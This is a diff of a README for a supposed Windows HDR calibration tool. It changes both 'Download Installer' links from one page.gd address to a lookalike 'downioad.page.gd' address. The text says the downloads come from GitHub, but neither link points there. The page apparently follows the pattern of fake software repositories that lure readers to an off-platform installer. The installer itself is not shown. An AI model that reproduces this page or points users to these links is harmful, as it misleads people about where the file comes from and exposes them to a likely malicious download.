@@ -2,7 +2,7 @@
 
 Welcome to HDR Calibration Tool 2026, your go-to solution for perfecting HDR display settings on Windows. This tool helps you calibrate colors, adjust brightness, and fix common HDR issues for an enhanced viewing experience. Whether you're a gamer, content creator, or everyday user, our software ensures your HDR-capable monitor performs at its best.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -71,4 +71,4 @@ For advanced users, the tool provides export and import functions for calibratio
 
 Ready to enhance your HDR experience? Download the latest version from GitHub:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
